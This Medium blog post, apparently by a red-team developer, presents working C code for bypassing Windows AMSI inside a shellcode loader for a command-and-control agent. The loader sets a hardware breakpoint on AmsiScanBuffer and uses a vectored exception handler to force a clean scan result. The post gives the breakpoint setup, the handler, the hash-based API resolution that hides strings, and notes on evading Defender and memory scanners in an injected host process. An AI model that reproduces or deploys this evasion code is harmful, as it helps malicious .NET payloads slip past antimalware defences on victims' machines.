# https://medium.com/@q3alique/lethe-amsi-veh-bypassing-amsi-without-patching-amsi-dll-part-3-7a208ea0708d

[Sitemap](https://medium.com/sitemap/sitemap.xml)

[Open in app](https://play.google.com/store/apps/details?id=com.medium.reader&referrer=utm_source%3DmobileNavBar&source=---top_nav_layout_nav-------------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40q3alique%2Flethe-amsi-veh-bypassing-amsi-without-patching-amsi-dll-part-3-7a208ea0708d&source=post_page---top_nav_layout_nav-----------------------global_nav--------------------)

[Medium Logo](https://medium.com/?source=---top_nav_layout_nav-------------------------------------------)

Get app

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav--------------------)

[Search](https://medium.com/search?source=---top_nav_layout_nav-------------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40q3alique%2Flethe-amsi-veh-bypassing-amsi-without-patching-amsi-dll-part-3-7a208ea0708d&source=post_page---top_nav_layout_nav-----------------------global_nav--------------------)

![Unknown user](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

[![Qalique](https://miro.medium.com/v2/resize:fill:40:40/1*WGk2sfPffpXmEMyc65S3ew.jpeg)](https://medium.com/@q3alique?source=post_page---post_author_sidebar--7a208ea0708d-----------------fab1a67c8ef9------------------------)

## Qalique

Follow writer

[Red Team](https://medium.com/tag/red-team?source=post_page---header_tags--7a208ea0708d-----------------------------------------)

[Edr Evasion](https://medium.com/tag/edr-evasion?source=post_page---header_tags--7a208ea0708d-----------------------------------------)

[Command And Control](https://medium.com/tag/command-and-control?source=post_page---header_tags--7a208ea0708d-----------------------------------------)

[Pentesting](https://medium.com/tag/pentesting?source=post_page---header_tags--7a208ea0708d-----------------------------------------)

[Cybersecurity](https://medium.com/tag/cybersecurity?source=post_page---header_tags--7a208ea0708d-----------------------------------------)

# lethe\_amsi\_veh: Bypassing AMSI Without Patching amsi.dll (Part 3)

[![Qalique](https://miro.medium.com/v2/resize:fill:32:32/1*WGk2sfPffpXmEMyc65S3ew.jpeg)](https://medium.com/@q3alique?source=post_page---byline--7a208ea0708d-----------------------------------------)

[Qalique](https://medium.com/@q3alique?source=post_page---byline--7a208ea0708d-----------------------------------------)

Follow

7 min read

·

Sep 25, 2026

2

[Listen](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3D7a208ea0708d&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40q3alique%2Flethe-amsi-veh-bypassing-amsi-without-patching-amsi-dll-part-3-7a208ea0708d&source=---header_actions--7a208ea0708d---------------------post_audio_button--------------------)

Share

_Bypassing AMSI from inside shellcode, without touching a single byte of amsi.dll_

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*camMOQxRHSYT-Mo7_TVkmQ.jpeg)

The previous article covered how `lethargic_sleep` keeps the managed agent's scratch buffer encrypted during sleep. That technique relies on a function pointer passed from ghost\_loader to the managed agent at startup. But there is a step that happens before the agent ever runs. The CLR scans the assembly bytes through AMSI during `Assembly.Load`, before the entry method is invoked, before the agent exists. If that scan is not bypassed, nothing starts.

This is the story of `lethe_amsi_veh`: the hardware-breakpoint VEH handler that intercepts `AmsiScanBuffer` without writing a single byte to amsi.dll's pages. What the problem looks like when you are in native C shellcode instead of managed code, the approaches I considered, the one I chose, and what the x64 calling convention had to teach me before it worked correctly.

## The problem

AMSI (Antimalware Scan Interface) is a Windows API that security products hook into. Before the CLR executes any .NET assembly loaded through `Assembly.Load`, it calls `AmsiScanBuffer` with the raw bytes. The call returns a result value. If that value is anything other than `AMSI_RESULT_CLEAN` (0), the load throws a security exception and the assembly never runs.

For a standalone agent or a traditional loader, handling this from managed code is straightforward. The agent patches `AmsiScanBuffer` early in its startup, before loading anything sensitive.

Ghost\_loader changes the ordering. The AMSI scan fires during `AppDomain.Load_3`, which is the native COM call that hands the byte array to the CLR. The managed entry method is invoked by `Invoke_3`, which comes after `Load_3` succeeds. The managed agent does not exist at the point where the scan runs. There is no hook in managed code that executes in time.

## Potential approaches

### Inline patch

The standard approach: overwrite the first bytes of `AmsiScanBuffer` so the function returns immediately with a clean result. Simple, widely documented, and it works.

It also modifies amsi.dll’s loaded pages. The PE section that contains `AmsiScanBuffer` is part of a legitimately mapped module. Memory scanners compare loaded module pages against the on-disk image. Modified bytes at the function's entry point are exactly what Defender's `AMSI_Patch_T.B12` and similar detections look for. The patch works until it is checked, and it is always checked.

### Delegating to the managed agent

Ghost\_loader passes a `-1` sentinel to the managed agent, which skips `ApplyPatches()`. That was a deliberate choice explained in the previous article. But even setting the sentinel aside, the timing is wrong. `ApplyPatches()` runs inside the entry method, which is called by `Invoke_3`. `Invoke_3` only runs after `Load_3` returns successfully. `Load_3` is where the AMSI scan fires. You cannot patch a function from code that only runs if that function already passed.

### VEH with a hardware execute breakpoint

Instead of modifying amsi.dll’s pages, install a Vectored Exception Handler and arm a hardware execute breakpoint on `AmsiScanBuffer`'s address. The CPU generates an exception the moment execution reaches that address, before the function body runs. The handler intercepts the exception, writes the result, and redirects the instruction pointer past the function entirely. amsi.dll is not touched.

This is the approach Lethe uses.

## The constraints in shellcode

In a normal process, this is about a dozen lines. In PIC shellcode, three constraints make it harder.

No plaintext strings. A standard implementation would call `AddVectoredExceptionHandler`, load `amsi.dll`, and call `GetProcAddress("AmsiScanBuffer")`. All of those names are plaintext strings in the binary. Ghost\_loader does not have plaintext strings. Every function and module name is resolved by DJB2 hash, computed at build time by `lsg.py` and substituted into the template before compilation. Nothing in the shellcode binary spells out `AmsiScanBuffer`.

Timing. The VEH handler and the DR0 breakpoint must be in place before `Assembly.Load` fires. In ghost\_loader's execution order, AMSI setup happens after the payload is re-encrypted into `g_ManagedBase` and immediately before `AppDomain.Load_3` is called. That is the only valid window.

Thread scope. `AddVectoredExceptionHandler` installs a handler process-wide, but `Dr0` is per-thread. The breakpoint fires only on the thread that set it. Ghost\_loader's main thread calls `Assembly.Load`. The CLR's AMSI scan runs on that same thread. Setting `Dr0` on the ghost\_loader thread is exactly right, and no other thread in the host process is affected.

## What lethe\_amsi\_veh actually does

Setup happens in `ghost_start()`, right before `Load_3`. All function pointers are hash-resolved. The handler is registered first, then the thread context is read, modified, and written back.

## Get Qalique’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Subscribe

Remember me for faster sign in

ghost\_loader.c \| AMSI setup (before Assembly.Load)

```
typedef PVOID (WINAPI *AVEH_t)(ULONG, PVECTORED_EXCEPTION_HANDLER);
typedef LONG  (WINAPI *NtGCT_t)(HANDLE, PCONTEXT);
typedef LONG  (WINAPI *NtSCT_t)(HANDLE, PCONTEXT);
```

```
HMODULE hNtdll = get_module({H_NTDLL});
AVEH_t  pAVEH  = (AVEH_t) get_proc(k32,    {H_ADDVECTOREDEXCEPTIONHANDLER});
NtGCT_t pNtGCT = (NtGCT_t)get_proc(hNtdll, {H_NTGETCONTEXTTHREAD});
NtSCT_t pNtSCT = (NtSCT_t)get_proc(hNtdll, {H_NTSETCONTEXTTHREAD});HMODULE hAmsi = pLoadLibraryA("amsi.dll");
if (hAmsi && pAVEH && pNtGCT && pNtSCT) {
    FARPROC pASB = get_proc(hAmsi, {H_AMSISCANBUFFER});
    if (pASB) {
        g_AmsiScanBuffer_VA = (PVOID)pASB;        // Install VEH first in chain
        pAVEH(1, (PVECTORED_EXCEPTION_HANDLER)lethe_amsi_veh);        // Arm hardware execute breakpoint on DR0 for this thread
        // -2 = GetCurrentThread() pseudo-handle
        // CONTEXT_DEBUG_REGISTERS (x64) = 0x100010
        CONTEXT ctx;
        ctx.ContextFlags = 0x100010;
        pNtGCT((HANDLE)(LONGLONG)-2, &ctx);
        ctx.Dr0 = (DWORD64)(ULONG_PTR)pASB;
        // L0=1 (local enable), condition0=00 (execute), size0=00 (byte)
        ctx.Dr7 = (ctx.Dr7 & ~(DWORD64)0x000F0003ULL) | (DWORD64)0x01;
        pNtSCT((HANDLE)(LONGLONG)-2, &ctx);
    }
}
```

When execution reaches `AmsiScanBuffer`, the CPU fires `EXCEPTION_SINGLE_STEP`. The VEH handler checks that the faulting address matches `g_AmsiScanBuffer_VA`, writes the result, and redirects execution.

ghost\_loader.c \| VEH handler

```
static LONG NTAPI lethe_amsi_veh(struct _EXCEPTION_POINTERS* ep)
{
    if (ep->ExceptionRecord->ExceptionCode == (DWORD)0x80000004UL &&
        g_AmsiScanBuffer_VA != NULL &&
        (PVOID)ep->ContextRecord->Rip == g_AmsiScanBuffer_VA)
    {
        DWORD64 sp = ep->ContextRecord->Rsp;

        // Write AMSI_RESULT_CLEAN (0) into *result — the 6th argument
        DWORD* pResult = *(DWORD**)(sp + 0x30);
        if (pResult) *pResult = 0;

        // Return S_OK and jump past the function body
        ep->ContextRecord->Rax = 0;              // HRESULT S_OK
        ep->ContextRecord->Rip = *(DWORD64*)sp;  // return address
        ep->ContextRecord->Rsp = sp + 8;         // pop return address

        return (LONG)(-1);  // EXCEPTION_CONTINUE_EXECUTION
    }
    return (LONG)0;         // EXCEPTION_CONTINUE_SEARCH
}
```

## Reading the stack at function entry

The handler reads `AMSI_RESULT*` from `sp + 0x30`. That is not a guess or an offset found by trial and error. It follows directly from the x64 Windows calling convention at the moment the breakpoint fires.

The breakpoint fires at the very first byte of `AmsiScanBuffer`, before its prolog has executed. At that moment the stack looks like this:

```
AmsiScanBuffer stack frame — at hardware breakpoint, before prolog
──────────────────────────────────────────────────────────────────
RSP+0x00 return address ← pushed by CALL, RIP will jump here
RSP+0x08 shadow space (arg1 RCX) caller-allocated, 32 bytes
RSP+0x10 shadow space (arg2 RDX) RSP+0x18 shadow space (arg3 R8)
RSP+0x20 shadow space (arg4 R9) RSP+0x28 arg5: HAMSISESSION amsiSession
RSP+0x30 arg6: AMSI_RESULT* result ← *(DWORD**)(sp + 0x30)
```

The first four arguments arrived in registers (RCX, RDX, R8, R9). The caller allocated 32 bytes of shadow space for them on the stack before the call. Then it pushed the 5th and 6th arguments. The callee’s prolog has not run yet, so RSP has not moved. The layout is fixed by the ABI, not by any specific version of amsi.dll.

Dereferencing `*(DWORD**)(sp + 0x30)` gives the pointer the caller passed as the result parameter. Writing 0 to what it points to sets `AMSI_RESULT_CLEAN` in the caller's variable, before `AmsiScanBuffer` has executed a single instruction of its own.

## The connection to the previous article

The `-1` sentinel that ghost injection mode passes to the managed agent serves two purposes. The previous article explained the first: it routes `ExecuteSleep` to plain `Thread.Sleep` instead of the native callback, because the CFG constraint makes passing a shellcode function pointer unsafe. The second purpose is here.

In standalone EXE mode, the managed agent calls `ApplyPatches()` to handle AMSI. In ghost injection mode, ghost\_loader already bypassed AMSI in native C before the CLR loaded. If the managed agent also patches, it creates a second instrumentation window inside amsi.dll after assembly load. Memory scanners pick up modified module pages. The `-1` check prevents the double-patch.

ghost\_loader.c \| -1 sentinel tells the agent to skip managed patching

```
pVar[0].vt    = VT_I8;
pVar[0].llVal = -1;   // ghost mode: AMSI already handled, skip ApplyPatches()
```

advanced\_agent.cs — the agent honours the sentinel

```
bool ghostMode = (sleepPtr == -1);
if (ghostMode)
{
    _noSleepMask = true;
    sleepPtr     = 0;
    // ApplyPatches() intentionally not called —
    // ghost_loader handled AMSI before CLR load
}
_unmanagedSleep = sleepPtr;
```

The two articles are describing the same protocol from different angles. The `-1` value is not just a sleep-mode flag. It is ghost\_loader telling the agent everything it did before handing over control: AMSI is already bypassed, sleep masking is not available, do not undo either of those decisions.

## Lessons learned

The first lesson is the one I keep arriving at from different directions: fix a problem at the layer where the problem actually exists. AMSI fires during a native COM call in C code. Any managed-code bypass that works correctly is working because the scan already passed, which means it is not doing the bypass, it is doing something else. The right place to intercept the scan is native C, before the CLR ever gets the bytes.

The second lesson is about what hardware debug registers actually offer. The common framing is that they are harder to detect than inline patches. The more accurate framing is that they are absent from the threat model that memory scanners address. Memory scanners compare loaded module pages against on-disk images. DR0 through DR7 are CPU register state. They do not appear in any memory mapping. There is nothing to compare. The advantage is not that detection is harder. It is that the data structure a scanner would need does not exist.

The third lesson is about the calling convention. `sp + 0x30` is not a magic number found by debugging. It is return address at RSP, 32 bytes of shadow space above it, 5th argument at RSP+0x28, 6th at RSP+0x30. The precision of that model is what makes the handler reliable. An imprecise understanding of "arguments are on the stack somewhere" would produce fragile offsets that break across compiler versions or calling patterns. A precise understanding of what the CPU state is at the exact instruction the breakpoint fires produces five lines that work everywhere.

The fourth lesson is specific to this combination of technique and context. A hardware breakpoint is per-thread, but `AddVectoredExceptionHandler` is process-wide. That asymmetry is not a limitation to work around. It is the feature that makes the technique clean inside a host process. The ghost\_loader thread sets its own `Dr0`. The handler fires only on that thread, only when that thread calls `AmsiScanBuffer`. The hundred other threads in `dllhost.exe` are unaffected. The bypass is precisely scoped to the operation that needs it.

[Red Team](https://medium.com/tag/red-team?source=post_page---footer_tags--7a208ea0708d-----------------------------------------)

[Edr Evasion](https://medium.com/tag/edr-evasion?source=post_page---footer_tags--7a208ea0708d-----------------------------------------)

[Command And Control](https://medium.com/tag/command-and-control?source=post_page---footer_tags--7a208ea0708d-----------------------------------------)

[Pentesting](https://medium.com/tag/pentesting?source=post_page---footer_tags--7a208ea0708d-----------------------------------------)

[Cybersecurity](https://medium.com/tag/cybersecurity?source=post_page---footer_tags--7a208ea0708d-----------------------------------------)

[![Qalique](https://miro.medium.com/v2/resize:fill:48:48/1*WGk2sfPffpXmEMyc65S3ew.jpeg)](https://medium.com/@q3alique?source=post_page---post_author_info--7a208ea0708d-----------------------------------------)

[![Qalique](https://miro.medium.com/v2/resize:fill:64:64/1*WGk2sfPffpXmEMyc65S3ew.jpeg)](https://medium.com/@q3alique?source=post_page---post_author_info--7a208ea0708d-----------------------------------------)

Follow

[**Written by Qalique**](https://medium.com/@q3alique?source=post_page---post_author_info--7a208ea0708d-----------------------------------------)

[4 followers](https://medium.com/@q3alique/followers?source=post_page---post_author_info--7a208ea0708d-----------------------------------------)

· [7 following](https://medium.com/@q3alique/following?source=post_page---post_author_info--7a208ea0708d-----------------------------------------)

Follow

[Help](https://help.medium.com/hc/en-us?source=post_page-----7a208ea0708d-----------------------------------------)

[Status](https://status.medium.com/?source=post_page-----7a208ea0708d-----------------------------------------)

[About](https://medium.com/about?autoplay=1&source=post_page-----7a208ea0708d-----------------------------------------)

[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----7a208ea0708d-----------------------------------------)

[Press](mailto:pressinquiries@medium.com)

[Blog](https://blog.medium.com/?source=post_page-----7a208ea0708d-----------------------------------------)

[Store](https://medium.com/store)

[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----7a208ea0708d-----------------------------------------)

[Rules](https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page-----7a208ea0708d-----------------------------------------)

[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----7a208ea0708d-----------------------------------------)

[Text to speech](https://speechify.com/medium?source=post_page-----7a208ea0708d-----------------------------------------)